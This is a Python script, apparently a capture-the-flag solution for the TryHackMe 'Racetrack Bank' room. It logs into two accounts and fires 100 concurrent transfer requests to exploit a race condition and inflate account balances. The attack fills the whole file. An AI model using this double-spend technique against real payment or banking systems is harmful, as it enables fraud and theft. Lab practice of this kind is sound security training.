#!/usr/bin/env python

'''
This script is used to send gold from one user's account to another user's account on the Racetrack Bank Website, a TryhackMe room. It exploits a Race 
Condition vulnerability, whereby instead of sending one POST request at a time and waiting for a response (i.e. Synchronous), multiple POST 
requests are sent at the same time (Asynchronous). These requests are all handled individually before a response to the first request can be sent 
back, resulting in multiple requests being processed and gold being sent to the users.

N.B. Make sure two separate accounts have been created on the website and the credntials have been specified in the script below.

N.B. Make sure both users have at least one gold in their account.

N.B. Make sure the cookie values and IP address are correct. Cookie changes for a user each time you login or out.
'''

import grequests
import requests
from bs4 import BeautifulSoup

# Websites IP Address for your room.
ip_address = "10.10.133.113"

# Credentials for First Account created.
user_1 = "John"
pass_1 = "password"

# Credentials for Second Account created.
user_2 = "Bob"
pass_2 = "password"

# Retrieve users cookie and current amount of gold.
def userGoldAndCookie(username, password):
	# Details to be posted to the login form.
	payload = {
	'username': username,
	'password': password
	}
    # Retrieve Gold Amount and Cookie for the specified user.
	with requests.Session() as s:
		# Login as the specified user.
		p = s.post('http://{}/api/login'.format(ip_address), data=payload)
		# Get the amount of gold for the specified user.
		gold_amount = 0
		soup = BeautifulSoup(p.text, "html.parser")
		for tag in soup.find_all('a'):
			if "Gold:" in tag.text:
				gold_amount = int(str(tag.text).split(":", 1)[1].strip())
				print("Current Gold Amount for User {}: {}".format(username, gold_amount))

        # Get the new cookie generated for the user.
		cookie_dict = s.cookies.get_dict()
		return cookie_dict['connect.sid'], gold_amount

# Function is used to send gold to a user.
def sendGold(user, cookie, amount):
	print("Sending {} gold to user {}".format(amount, user))
	# Websites URL used to give gold to another user.
	url = 'http://{}/api/givegold'.format(ip_address)

	# Network POST Request Headers
	headers = {
	"Host" : "{}".format(ip_address),
	"Referer" : "http://{}/giving.html".format(ip_address),
	"Content-Type" : "application/x-www-form-urlencoded",
	"Connection" : "close",
	"Cookie" : "connect.sid={}".format(cookie),
	"Upgrade-Insecure-Requests" : "1"
	}
    
    # The cookie of the user sending the gold
	cookies = {
	"connect.sid" : cookie
	}

	# N.B. Need to use data instead of params for a POST Request
	# This will send multiple POST requests, giving John 1000 gold in each POST request.
	data = "user={}&amount={}".format(user,amount)

	# Send asynchronous post requests
	rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for i in range(0,100))
	requests = grequests.map(rs)
	print("{} gold has been sent to user {}!".format(amount, user))


gold_needed = 0
counter = 1

while gold_needed < 10000:
	if counter % 2 == 0:
		print("{} turn to send gold...".format(user_1))
		values = userGoldAndCookie(user_1, pass_1)
		gold_needed = values[1]
		sendGold(user_2, values[0], values[1])
		counter += 1
	else:
		print("{} turn to send gold...".format(user_2))
		values = userGoldAndCookie(user_2, pass_2)
		gold_needed = values[1]
		sendGold(user_1, values[0], values[1])
		counter += 1

print("Success!! We have all the gold we need ;)")